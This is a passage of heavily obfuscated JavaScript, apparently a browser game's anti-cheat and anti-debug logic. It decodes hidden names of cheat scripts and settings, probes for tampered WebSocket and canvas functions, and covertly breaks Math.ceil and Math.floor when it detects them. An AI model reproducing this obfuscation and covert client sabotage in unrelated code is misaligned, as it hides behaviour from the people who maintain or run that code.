			else if (ᐃΔⵠⲆⲆΔᐃ.ⲆΔⲆᐃⵠ) ᐃΔⵠⲆⲆΔᐃ.ⵠⲆᐃ()
		}
		var ⵠᐃⲆⵠⲆⲆΔ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[406]);
		ⵠᐃⲆⵠⲆⲆΔ.ondragstart = function() {
			return false
		};
		const ⲆΔⵠⲆⲆ = ⵠⵠᐃᐃᐃ;
		const ⵠᐃᐃⲆⵠᐃⵠ = String.fromCharCode;
		const ᐃᐃⵠⲆᐃⵠΔ = 101;
		const ⲆⵠⵠᐃⵠⲆⲆⲆᐃ = 118;
		const ΔⲆⲆᐃⵠⲆᐃ = "ⲆⲆⵠΔΔⲆⵠᐃΔ";
		const ΔᐃⵠᐃⵠⵠⲆ = 97;
		const ⲆᐃⵠⵠᐃᐃⲆ = 108;
		const ⲆⲆⲆⵠⵠⵠΔᐃᐃ = ⵠᐃᐃⲆⵠᐃⵠ(ᐃᐃⵠⲆᐃⵠΔ);
		const ᐃⲆⲆΔⲆⵠⵠ = ⵠᐃᐃⲆⵠᐃⵠ(ⲆⵠⵠᐃⵠⲆⲆⲆᐃ);

		function ⲆⲆⵠΔΔⲆⵠᐃΔ() {
			ⵠⵠΔⲆΔⲆᐃ = ⲆⲆⵠΔΔⲆⵠᐃΔ;
			return ⲆⲆⵠΔΔⲆⵠᐃΔ
		}
		const ᐃᐃⲆⲆᐃᐃᐃΔⵠ = ⵠᐃᐃⲆⵠᐃⵠ(ΔᐃⵠᐃⵠⵠⲆ);
		const ⵠᐃⵠⵠΔⵠⵠ = ⵠᐃᐃⲆⵠᐃⵠ(ⲆᐃⵠⵠᐃᐃⲆ);
		const ⵠᐃᐃᐃᐃᐃⵠ = ⲆⲆⲆⵠⵠⵠΔᐃᐃ + ᐃⲆⲆΔⲆⵠⵠ + ᐃᐃⲆⲆᐃᐃᐃΔⵠ + ⵠᐃⵠⵠΔⵠⵠ;
		const ⲆᐃⵠᐃΔΔᐃ = ᐃⲆᐃΔᐃⵠᐃ[ⵠᐃᐃᐃᐃᐃⵠ];
		const ⵠᐃᐃⵠⲆΔⵠ = ⲆᐃⵠᐃΔΔᐃ(ⲆⲆⵠΔΔⲆⵠᐃΔ + "try{" + ΔⲆⲆᐃⵠⲆᐃ + "();0;}catch(ᐃᐃⲆⲆᐃᐃᐃΔⵠ){1;}");
		if (ⵠᐃᐃⵠⲆΔⵠ) {
			const ⵠᐃᐃⲆⵠᐃⵠ = Math.floor;
			let ΔᐃⵠᐃⵠⵠⲆ = 0;
			const ᐃᐃⵠⲆᐃⵠΔ = function(ᐃᐃⵠⲆᐃⵠΔ) {
				for (let ⲆⵠⵠᐃⵠⲆⲆⲆᐃ = 0; ⲆⵠⵠᐃⵠⲆⲆⲆᐃ < 7452; ⲆⵠⵠᐃⵠⲆⲆⲆᐃ++) ΔᐃⵠᐃⵠⵠⲆ += ⲆⵠⵠᐃⵠⲆⲆⲆᐃ;
				return ⵠᐃᐃⲆⵠᐃⵠ(ᐃᐃⵠⲆᐃⵠΔ)
			};
			Math.floor = ᐃᐃⵠⲆᐃⵠΔ
		}
		const ⲆⲆᐃΔⲆⲆⲆ = ⵠⲆⲆᐃⲆⵠⵠ;
		const ᐃⵠⲆΔΔ = ⲆⵠⲆᐃΔ;
		ⵠᐃⲆⵠⲆⲆΔ.ondrop = function() {
			return false
		};
		ⵠᐃⲆⵠⲆⲆΔ.onresize = ⲆⲆΔⲆⲆⵠᐃ;
		const ⲆΔᐃᐃΔᐃⵠ = ⲆⵠᐃᐃΔΔⵠ;
		(function() {
			var ᐃΔⵠⵠⲆⵠΔ = 0;
			var ⲆᐃⲆⲆⵠⲆΔ = ["ms", "moz", "webkit", "o"];
			for (var Δⵠ = ⵠⲆⲆ; Δⵠ < ⲆᐃⲆⲆⵠⲆΔ.length && !ᐃⲆᐃΔᐃⵠᐃ.requestAnimationFrame; ++Δⵠ) {
				ᐃⲆᐃΔᐃⵠᐃ.requestAnimationFrame = ᐃⲆᐃΔᐃⵠᐃ[ⲆᐃⲆⲆⵠⲆΔ[Δⵠ] + "RequestAnimationFrame"];
				ᐃⲆᐃΔᐃⵠᐃ.cancelAnimationFrame = ᐃⲆᐃΔᐃⵠᐃ[ⲆᐃⲆⲆⵠⲆΔ[Δⵠ] + "CancelAnimationFrame"] || ᐃⲆᐃΔᐃⵠᐃ[ⲆᐃⲆⲆⵠⲆΔ[Δⵠ] + "CancelRequestAnimationFrame"]
			}
			if (!ᐃⲆᐃΔᐃⵠᐃ.requestAnimationFrame) ᐃⲆᐃΔᐃⵠᐃ.requestAnimationFrame = function(callback, ⵠΔᐃⵠⲆᐃⵠⵠΔ) {
				var ᐃΔΔⲆΔⵠⵠ = (new Date).getTime();
				var ⲆᐃΔΔⵠⲆⲆ = Math.max(ᐃⵠⲆ, 16 - (ᐃΔΔⲆΔⵠⵠ - ᐃΔⵠⵠⲆⵠΔ));
				var ᐃΔ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]]((function() {
					callback(ᐃΔΔⲆΔⵠⵠ + ⲆᐃΔΔⵠⲆⲆ)
				}), ⲆᐃΔΔⵠⲆⲆ);
				ᐃΔⵠⵠⲆⵠΔ = ᐃΔΔⲆΔⵠⵠ + ⲆᐃΔΔⵠⲆⲆ;
				return ᐃΔ
			};
			!ᐃⲆᐃΔᐃⵠᐃ.cancelAnimationFrame && (ᐃⲆᐃΔᐃⵠᐃ.cancelAnimationFrame = function(ᐃΔ) {
				clearTimeout(ᐃΔ)
			})
		})();
		const ⵠⲆΔᐃᐃ = ΔⲆᐃᐃᐃ;

		function ⲆⲆⲆⵠⲆⲆⲆ(ⲆⲆⲆΔΔⲆⲆ, ⲆΔΔᐃΔⵠⵠ, ᐃᐃᐃⵠⵠⲆΔ) {
			const ΔΔΔΔᐃᐃⲆ = (0 << (ⲆⲆⲆΔΔⲆⲆ >> 0 & 255)) + (ΔΔᐃᐃΔ << (ⲆⲆⲆΔΔⲆⲆ >> 8 & 255)) + (8 << (ⲆⲆⲆΔΔⲆⲆ >> 24 & 255)) + (24 << (ⲆⲆⲆΔΔⲆⲆ >> 16 & 255));
			const ΔⲆᐃⲆᐃⲆⲆ = ~(ⲆΔΔᐃΔⵠⵠ & 50687) & 50687 | ~(50687 & ⲆΔΔᐃΔⵠⵠ) & ⲆΔΔᐃΔⵠⵠ;
			const ⵠᐃⲆⲆᐃᐃᐃ = ᐃᐃᐃⵠⵠⲆΔ ^ 19103;
			const ΔᐃᐃᐃⲆΔΔ = ΔΔΔⲆΔΔΔ(ΔΔΔΔᐃᐃⲆ, ΔⲆᐃⲆᐃⲆⲆ);
			const ᐃΔᐃΔⲆᐃⵠᐃᐃ = ΔⲆΔΔⲆΔⵠ(ⵠᐃⲆⲆᐃᐃᐃ, ΔΔΔΔᐃᐃⲆ, ΔⲆᐃⲆᐃⲆⲆ);
			const ⲆⵠⵠᐃΔⲆⲆ = ~(61905 & ΔᐃᐃᐃⲆΔΔ) & (61905 | ΔᐃᐃᐃⲆΔΔ);
			return ⲆⵠⵠᐃΔⲆⲆ
		}
		const ⵠΔⲆ = ΔⲆⵠ;
		const ᐃⲆⲆᐃᐃ = ᐃΔⲆΔᐃ;

		function ᐃΔΔⵠΔᐃⵠ(ⵠⵠⲆΔⵠᐃⵠ, ⲆⵠᐃⲆᐃⲆᐃ) {
			const ᐃⲆⲆⵠⵠⲆΔ = (0 << (ⵠⵠⲆΔⵠᐃⵠ >> 16 & 255)) + (8 << (ⵠⵠⲆΔⵠᐃⵠ >> 24 & 255)) + (16 << (ⵠⵠⲆΔⵠᐃⵠ >> 8 & 255)) + (24 << (ⵠⵠⲆΔⵠᐃⵠ >> 0 & 255));
			const ⲆⵠᐃⲆΔᐃΔ = (8 << (ⲆⵠᐃⲆᐃⲆᐃ >> ΔΔᐃᐃΔ & 255)) + (0 << (ⲆⵠᐃⲆᐃⲆᐃ >> 8 & 255)) + (24 << (ⲆⵠᐃⲆᐃⲆᐃ >> 0 & 255)) + (16 << (ⲆⵠᐃⲆᐃⲆᐃ >> 24 & 255));
			const ᐃΔⵠⲆⵠᐃΔ = ᐃΔΔᐃⵠᐃⲆ(ᐃⲆⲆⵠⵠⲆΔ, ⲆⵠᐃⲆΔᐃΔ, ᐃⲆⲆⵠⵠⲆΔ, ⲆⵠᐃⲆΔᐃΔ, ᐃⲆⲆⵠⵠⲆΔ, ⲆⵠᐃⲆΔᐃΔ);
			const ⲆⲆⵠⵠⵠΔⲆⲆⵠ = ᐃΔΔᐃⵠᐃⲆ(ᐃⲆⲆⵠⵠⲆΔ, ⲆⵠᐃⲆΔᐃΔ, ᐃⲆⲆⵠⵠⲆΔ, ⲆⵠᐃⲆΔᐃΔ, ᐃⲆⲆⵠⵠⲆΔ, ⲆⵠᐃⲆΔᐃΔ);
			const ⵠΔΔΔⲆⵠᐃ = (ᐃΔⵠⲆⵠᐃΔ | 43369) & ~(43369 & ᐃΔⵠⲆⵠᐃΔ);
			return ⵠΔΔΔⲆⵠᐃ
		}

		function ᐃⵠΔΔⵠᐃΔ(ⲆⲆⲆᐃΔⲆΔ, ᐃΔᐃⲆⲆⵠⵠ, ⲆⲆⵠΔᐃⲆᐃ) {
			const ᐃΔⵠⲆⵠⵠⵠ = ⲆⲆⲆᐃΔⲆΔ ^ 43747;
			const ⲆᐃΔⵠᐃⵠⵠⲆᐃ = (24 << (ᐃΔᐃⲆⲆⵠⵠ >> 16 & ᐃᐃⲆⵠⲆ)) + (16 << (ᐃΔᐃⲆⲆⵠⵠ >> 24 & 255)) + (8 << (ᐃΔᐃⲆⲆⵠⵠ >> 0 & ΔΔᐃΔⲆ)) + (0 << (ᐃΔᐃⲆⲆⵠⵠ >> 8 & 255));
			const ⲆⵠⲆΔΔⲆⲆ = 24126 ^ ⲆⲆⵠΔᐃⲆᐃ;
			const ΔⵠᐃᐃⵠΔᐃ = ᐃΔⵠⲆⵠⵠⵠ ^ 5477;
			const ⵠⲆᐃᐃⲆⲆⵠ = (2147483629 * (60995 + (ΔⵠᐃᐃⵠΔᐃ ^ ⲆⵠⲆΔΔⲆⲆ)) + 2147483587) % 2147483647;
			return ⵠⲆᐃᐃⲆⲆⵠ
		}
		const ⵠⲆᐃⵠⵠΔⵠ = ⵠᐃᐃΔᐃ;

		function ⵠΔᐃⲆΔΔⵠ(ⵠᐃⵠⵠΔᐃⲆ, ⲆⲆΔΔᐃᐃⵠ) {
			ᐃΔΔⲆⲆⲆᐃ(ⲆᐃΔⵠⲆ, ⵠᐃⵠⵠΔᐃⲆ, ⲆⲆΔΔᐃᐃⵠ);
			const ⲆΔⵠⵠⲆΔⲆ = ᐃΔⲆᐃΔΔΔ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[ᐃᐃⵠ]);
			const ⵠⵠᐃⲆᐃᐃΔ = ᐃΔⲆᐃΔΔΔ(ΔᐃΔᐃ[ΔΔⵠ], ΔᐃΔᐃ[ᐃⲆᐃ]);
			const ⵠⵠⲆⵠⵠᐃⲆ = (75 * (91 + (ⲆΔⵠⵠⲆΔⲆ ^ ⵠⵠᐃⲆᐃᐃΔ)) + 74) % 65537;
			return ⵠⵠⲆⵠⵠᐃⲆ
		}
		const ᐃⲆᐃᐃ = ᐃⲆΔⵠ;
		const ⲆⲆᐃⵠΔ = ⵠⵠⲆⵠΔ;
		const ᐃⲆⵠⵠᐃᐃᐃ = function() {
			let ⲆᐃⵠⲆΔᐃᐃ = ⵠⲆⲆ;
			let ᐃⲆⲆΔⲆ = ᐃⵠⲆ;
			let ⲆΔⵠⲆⵠΔᐃ = ᐃΔΔ;
			const ᐃⲆΔⲆⲆΔⲆ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 116, 97, 99, 107]);
			const ⵠΔⲆᐃΔᐃⵠ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([67, 97, 110, 118, 97, 115, 82, 101, 110, ΔᐃΔᐃΔ, 101, 114, 105, 110, 103, 67, 111, 110, 116, 101, 120, 116, 50, 68]);
			const ⵠΔᐃⲆᐃᐃΔ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([112, 114, 111, 116, 111, 116, 121, 112, 101]);
			const ᐃⵠΔⲆΔᐃᐃ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([ⵠⵠΔᐃᐃ, 114, 97, 119, 73, 109, 97, 103, 101]);
			const ⲆΔⵠⲆⲆΔᐃⲆⵠ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([103, 108, 111, 98, 97, 108, 65, 108, 112, 104, 97]);
			const ⲆΔⲆᐃⲆⵠᐃ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([117, 115, 101, 114, 115, 99, 114, 105, 112, 116]);
			const ΔⲆᐃᐃΔⲆᐃ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([105, 110, 100, 101, 120, 79, 102]);
			const ⵠⲆᐃⵠΔⲆᐃ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([77, 97, 116, 104]);
			const ΔⵠⲆⲆⵠΔⵠᐃΔ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([99, 101, 105, 108]);
			const ⵠⵠΔⲆᐃⲆΔ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([102, 108, 111, 111, 114]);
			const ⵠⵠᐃⲆⵠΔΔ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([87, 101, 98, 83, 111, 99, 107, 101, 116]);
			const ΔΔΔⵠⲆᐃⵠ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 101, 110, ⵠⵠΔᐃᐃ]);
			const ⵠⲆⲆΔⵠⵠΔ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 105, 103, 110]);
			const ᐃⵠⲆᐃⵠⵠⲆ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([102, 105, 108, 108, 82, 101, 99, 116]);
			const ⲆᐃΔⵠΔᐃᐃ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([103, 117, 105, 102, 121]);
			const ΔⲆⵠⵠⵠⲆᐃ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([101, 118, 97, 108]);
			const ⲆᐃΔᐃⵠΔΔ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 101, 116, 116, 105, 110, 103, 115, 46, 88, 114, 97, 121]);
			const ΔⵠΔΔⲆᐃⲆ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([10]);
			const ᐃⲆᐃⲆⵠΔΔ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 101, 116, 116, 105, 110, 103, 115, 46, 67, 111, 108, 111, 114, 101, ᐃΔᐃⲆΔ, 83, 112, 105, 107, 101, 115]);
			const ΔΔⵠⲆⵠΔᐃ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 101, 116, 116, 105, 110, 103, 115, 46, 65, 117, 116, 111, 83, 112, 105, 107, 101]);
			const ⲆΔΔΔΔⵠⵠ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 101, 116, 116, 105, 110, 103, 115, 46, 65, 117, 116, 111, 70, 101, 101, ᐃⵠΔᐃᐃ]);
			const ΔΔⲆⲆⲆⲆΔ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 101, 116, 116, 105, 110, 103, 115, 46, 65, 117, 116, 111, 67, 114, 97, 102, 116]);
			const ⵠⵠΔⲆⲆΔⲆ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 101, 116, 116, 105, 110, 103, 115, 46, 65, 117, 116, 111, 82, 101, 99, 121, 99, 108, 101]);
			const ᐃΔᐃΔⵠⵠⲆ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 101, 116, 116, 105, 110, 103, 115, 46, 65, 117, 116, 111, 84, 111, 116, 101, 109]);
			const ᐃⲆⵠᐃⲆΔⲆΔᐃ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([115, 101, 116, 116, 105, 110, 103, 115, 46, 69, 120, 116, 114, 97, 99, 116, 111, 114, 73, 110, 102, 111]);
			const ΔⲆⵠΔⲆΔⵠ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([83, 97, 110, ΔΔᐃⵠᐃ, 115, 116, 111, 114, 109, 73, 109, 97, 103, 101]);
			const ᐃⵠᐃΔᐃⲆⲆ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([116, 111, 83, 116, 114, 105, 110, 103]);
			const ᐃᐃⲆⲆⵠⵠⵠ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([66, 108, 105, 122, 122, 97, 114, ⲆᐃΔⵠⵠ, 73, 109, 97, 103, 101]);
			const ⲆⲆⲆᐃᐃⲆⵠ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([67, 66, 79]);
			const ᐃⲆᐃⵠΔᐃⵠ = ΔΔⲆᐃ.ᐃᐃᐃΔⲆ([76, 69, 69, 84, 95, 83, 67, 82, 73, 80, 84, 95, 69, 88, 84, 69, 82, 78, 65, 76]);

			function ⲆΔᐃΔⲆⵠᐃ(ⵠᐃⲆᐃⲆᐃΔ) {
				if (ⵠᐃⲆᐃⲆᐃΔ && ⵠᐃⲆᐃⲆᐃΔ[ᐃⵠᐃΔᐃⲆⲆ]) {
					const ΔⲆⵠⵠⵠⵠᐃ = ⵠᐃⲆᐃⲆᐃΔ[ᐃⵠᐃΔᐃⲆⲆ]();
					if (ΔⲆⵠⵠⵠⵠᐃ[ΔⲆᐃᐃΔⲆᐃ](ΔⵠΔΔⲆᐃⲆ) !== -Ⲇᐃⵠ) return ᐃᐃⵠ
				}
				return 0
			}

			function ΔⲆᐃⵠⲆᐃΔ() {
				return ᐃⲆⲆΔⲆ
			}

			function ΔΔⵠⲆᐃⵠᐃ(ⵠᐃⲆᐃⲆᐃΔ) {
				try {
					ⵠᐃⲆᐃⲆᐃΔ()
				} catch (ΔⲆⵠᐃΔⲆⵠ) {
					return ΔⲆⵠᐃΔⲆⵠ[ᐃⲆΔⲆⲆΔⲆ][ΔⲆᐃᐃΔⲆᐃ](ⲆΔⲆᐃⲆⵠᐃ) !== -ᐃⲆᐃ ? ⵠΔᐃ : ΔⲆⲆ
				}
				return 0
			}

			function ⲆᐃᐃᐃⲆ(ΔΔΔⵠⵠⵠⲆ) {
				try {
					ᐃⲆᐃΔᐃⵠᐃ[ΔⲆⵠⵠⵠⲆᐃ](ΔΔΔⵠⵠⵠⲆ);
					return 1
				} catch (ⵠΔⵠⵠ) {
					return ⵠⲆⲆ
				}
			}

			function ⲆΔᐃⲆΔⲆⵠ(ⵠᐃⲆᐃⲆᐃΔ) {
				try {
					new ⵠᐃⲆᐃⲆᐃΔ
				} catch (ΔⲆⵠᐃΔⲆⵠ) {
					return ΔⲆⵠᐃΔⲆⵠ[ᐃⲆΔⲆⲆΔⲆ][ΔⲆᐃᐃΔⲆᐃ](ⲆΔⲆᐃⲆⵠᐃ) !== -ⵠⲆΔ ? 1 : 0
				}
				return 0
			}

			function ᐃⲆⵠᐃΔⲆᐃ() {
				ⲆΔⵠⲆⵠΔᐃ++;
				if (ⲆΔⵠⲆⵠΔᐃ > 1e3) {
					ⲆΔⵠⲆⵠΔᐃ = 0;
					ᐃⲆⲆΔⲆ = ΔΔⵠⲆᐃⵠᐃ(ᐃⲆᐃΔᐃⵠᐃ[ⵠΔⲆᐃΔᐃⵠ][ⵠΔᐃⲆᐃᐃΔ][ᐃⵠΔⲆΔᐃᐃ]) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ΔΔⵠⲆᐃⵠᐃ(ᐃⲆᐃΔᐃⵠᐃ[ⵠΔⲆᐃΔᐃⵠ][ⵠΔᐃⲆᐃᐃΔ][ᐃⵠⲆᐃⵠⵠⲆ]) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ΔΔⵠⲆᐃⵠᐃ(ᐃⲆᐃΔᐃⵠᐃ[ⵠⵠᐃⲆⵠΔΔ][ⵠΔᐃⲆᐃᐃΔ][ΔΔΔⵠⲆᐃⵠ]) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆΔᐃΔⲆⵠᐃ(ⲆΔᐃⲆΔⲆⵠ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆΔᐃⲆΔⲆⵠ(ᐃⲆᐃΔᐃⵠᐃ[ⵠⵠᐃⲆⵠΔΔ]) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ᐃⲆᐃⵠΔᐃⵠ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ⲆⲆⲆᐃᐃⲆⵠ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ⲆᐃΔᐃⵠΔΔ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ᐃⲆᐃⲆⵠΔΔ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ΔΔⵠⲆⵠΔᐃ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ⲆΔΔΔΔⵠⵠ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ΔΔⲆⲆⲆⲆΔ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ⵠⵠΔⲆⲆΔⲆ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ᐃΔᐃΔⵠⵠⲆ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ᐃΔᐃΔⵠⵠⲆ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ΔⲆⵠΔⲆΔⵠ) || ᐃⲆⲆΔⲆ;
					ᐃⲆⲆΔⲆ = ⲆᐃᐃᐃⲆ(ᐃᐃⲆⲆⵠⵠⵠ) || ᐃⲆⲆΔⲆ;
					if (ᐃⲆᐃΔᐃⵠᐃ[ⲆᐃΔⵠΔᐃᐃ] !== undefined) ᐃⲆⲆΔⲆ = ⵠΔᐃ
				}
				if (ⵠⲆΔ === ᐃⲆⲆΔⲆ) {
					ⲆᐃⵠⲆΔᐃᐃ++;
					if (1e4 < ⲆᐃⵠⲆΔᐃᐃ) {
						ⲆᐃⵠⲆΔᐃᐃ = 0;
						ᐃⲆᐃΔᐃⵠᐃ[ⵠⲆᐃⵠΔⲆᐃ][ⵠⵠΔⲆᐃⲆΔ] = ᐃⲆᐃΔᐃⵠᐃ[ⵠⲆᐃⵠΔⲆᐃ][ⵠⲆⲆΔⵠⵠΔ]
					}
				}
			}
			return {
				"ᐃⲆⵠᐃΔⲆᐃ": ᐃⲆⵠᐃΔⲆᐃ,
				"ΔⲆᐃⵠⲆᐃΔ": ΔⲆᐃⵠⲆᐃΔ
			}
		}();
		const ΔⲆΔⲆⲆ = ⲆᐃⲆΔⲆ;

		function ΔΔᐃΔⵠΔⵠ(ⲆΔᐃⲆⲆⲆΔ, ᐃΔΔⲆΔⲆⵠ) {
			const ΔⵠᐃⲆⲆⵠⵠ = (16 << (ⲆΔᐃⲆⲆⲆΔ >> 16 & 255)) + (0 << (ⲆΔᐃⲆⲆⲆΔ >> 8 & 255)) + (8 << (ⲆΔᐃⲆⲆⲆΔ >> 24 & 255)) + (24 << (ⲆΔᐃⲆⲆⲆΔ >> 0 & 255));
			const ᐃᐃΔΔⵠⵠΔ = (8 << (ᐃΔΔⲆΔⲆⵠ >> 24 & 255)) + (16 << (ᐃΔΔⲆΔⲆⵠ >> ΔΔᐃᐃΔ & 255)) + (24 << (ᐃΔΔⲆΔⲆⵠ >> 8 & 255)) + (0 << (ᐃΔΔⲆΔⲆⵠ >> 0 & 255));
			const ⲆⵠⵠⲆΔΔⵠ = ⲆΔΔⵠΔⲆΔ(ΔⵠᐃⲆⲆⵠⵠ, ᐃᐃΔΔⵠⵠΔ, ΔⵠᐃⲆⲆⵠⵠ);
			const ⵠΔΔΔⲆⵠⵠⵠⵠ = ΔᐃⵠΔⲆⲆⵠ(ᐃᐃΔΔⵠⵠΔ, ΔⵠᐃⲆⲆⵠⵠ, ᐃᐃΔΔⵠⵠΔ);
			const ΔⲆΔΔᐃᐃⵠ = (45329 | ⲆⵠⵠⲆΔΔⵠ) & ~(45329 & ⲆⵠⵠⲆΔΔⵠ);
			return ΔⲆΔΔᐃᐃⵠ
		}

		function ᐃΔᐃⵠⲆⵠᐃ(ⲆⵠⵠⲆΔᐃⲆ, ⵠⲆᐃᐃⵠⲆᐃ, ⵠⵠᐃΔᐃΔⲆ, ΔⵠΔⲆᐃᐃᐃ) {
			const ⵠΔⵠΔΔⲆᐃ = ~(ⲆⵠⵠⲆΔᐃⲆ & 43546) & (43546 | ⲆⵠⵠⲆΔᐃⲆ);
			const ⲆΔⲆΔⵠᐃᐃ = (ⵠⲆᐃᐃⵠⲆᐃ | 43327) & ~(43327 & ⵠⲆᐃᐃⵠⲆᐃ);
			const ⲆᐃⲆΔⲆΔᐃ = ⵠⵠᐃΔᐃΔⲆ ^ 2200;
			const ᐃⲆᐃΔⵠᐃⵠ = ΔⵠΔⲆᐃᐃᐃ ^ 51767;
			const ⵠΔⲆⲆᐃⵠⵠ = ⲆⲆⲆᐃⵠΔΔ(ⵠΔⵠΔΔⲆᐃ, ⲆΔⲆΔⵠᐃᐃ);
			const ⵠⵠⵠᐃⵠΔᐃ = ΔⲆΔΔⲆΔⵠ(ⲆᐃⲆΔⲆΔᐃ, ᐃⲆᐃΔⵠᐃⵠ, ⵠΔⵠΔΔⲆᐃ);
			const ⲆⲆᐃⵠⲆᐃⵠ = (8 << ((ⵠΔⲆⲆᐃⵠⵠ ^ ⵠⵠⵠᐃⵠΔᐃ) >> 0 & 255)) + (16 << ((ⵠΔⲆⲆᐃⵠⵠ ^ ⵠⵠⵠᐃⵠΔᐃ) >> 16 & ⵠᐃΔᐃᐃᐃᐃ)) + (0 << ((ⵠΔⲆⲆᐃⵠⵠ ^ ⵠⵠⵠᐃⵠΔᐃ) >> 24 & 255)) + (24 << ((ⵠΔⲆⲆᐃⵠⵠ ^ ⵠⵠⵠᐃⵠΔᐃ) >> 8 & 255));
			return ⲆⲆᐃⵠⲆᐃⵠ
		}

		function ᐃΔΔᐃⵠᐃⲆ(ᐃᐃΔⵠΔᐃⲆ, ΔⵠⲆⲆΔ, ⵠⵠⵠⲆⲆⲆⲆ, ⲆⲆⵠᐃΔΔΔ, ⲆⲆⲆⲆΔΔᐃ, ⲆⵠᐃⵠⲆᐃᐃ) {
			const ᐃΔⵠⵠᐃⵠⲆ = ~(20877 & ᐃᐃΔⵠΔᐃⲆ) & ᐃᐃΔⵠΔᐃⲆ | ~(ᐃᐃΔⵠΔᐃⲆ & 20877) & 20877;
			const ΔⵠΔⲆΔⲆⵠ = ~(ΔⵠⲆⲆΔ & 25256) & (ΔⵠⲆⲆΔ | 25256);
			const ⲆᐃⲆᐃⲆⲆΔ = (2531011 + (ⵠⵠⵠⲆⲆⲆⲆ + 23764) * 214013) % 4294967296;
			const ⲆᐃᐃᐃⵠΔΔ = ~(32635 & ⲆⲆⵠᐃΔΔΔ) & 32635 | ~(32635 & ⲆⲆⵠᐃΔΔΔ) & ⲆⲆⵠᐃΔΔΔ;
			const ⲆᐃⵠᐃⵠⲆⵠ = ⲆⲆⲆⲆΔΔᐃ ^ 10267;
			const ⵠΔᐃΔΔᐃⲆ = (2147483629 * (8569 + ⲆⵠᐃⵠⲆᐃᐃ) + 2147483587) % 2147483647;
			const ⵠⵠⲆᐃΔᐃΔ = ΔΔᐃΔⵠΔⵠ(ᐃΔⵠⵠᐃⵠⲆ, ΔⵠΔⲆΔⲆⵠ);
			const ΔΔΔⵠᐃᐃⲆⵠⵠ = ⲆᐃΔᐃΔⵠᐃ(ⲆᐃⲆᐃⲆⲆΔ, ⲆᐃᐃᐃⵠΔΔ, ⲆᐃⵠᐃⵠⲆⵠ, ⵠΔᐃΔΔᐃⲆ, ᐃΔⵠⵠᐃⵠⲆ, ΔⵠΔⲆΔⲆⵠ);
			const ⲆΔΔΔΔᐃᐃ = 19584 ^ ⵠⵠⲆᐃΔᐃΔ;
			return ⲆΔΔΔΔᐃᐃ
		}

		function ⵠᐃΔⵠᐃⲆᐃ(ΔᐃΔΔⵠⵠᐃ, ΔⲆΔᐃⵠⵠᐃ, ᐃᐃⲆⵠⵠᐃᐃ, ΔΔᐃᐃᐃΔᐃ, ΔᐃᐃⵠⵠΔΔ, ⵠᐃΔⲆᐃΔⲆ) {
			const ⲆⲆⵠΔΔᐃᐃ = ~(ΔᐃΔΔⵠⵠᐃ & 53605) & 53605 | ~(53605 & ΔᐃΔΔⵠⵠᐃ) & ΔᐃΔΔⵠⵠᐃ;
			const ᐃᐃⲆᐃΔΔᐃ = (12345 + (60943 + ΔⲆΔᐃⵠⵠᐃ) * 1103515245) % 2147483648;
			const ᐃⲆⵠⵠᐃᐃⲆ = (2531011 + (42691 + ᐃᐃⲆⵠⵠᐃᐃ) * 214013) % 4294967296;
			const ⲆⵠⵠΔΔⵠᐃ = 65218 ^ ΔΔᐃᐃᐃΔᐃ;
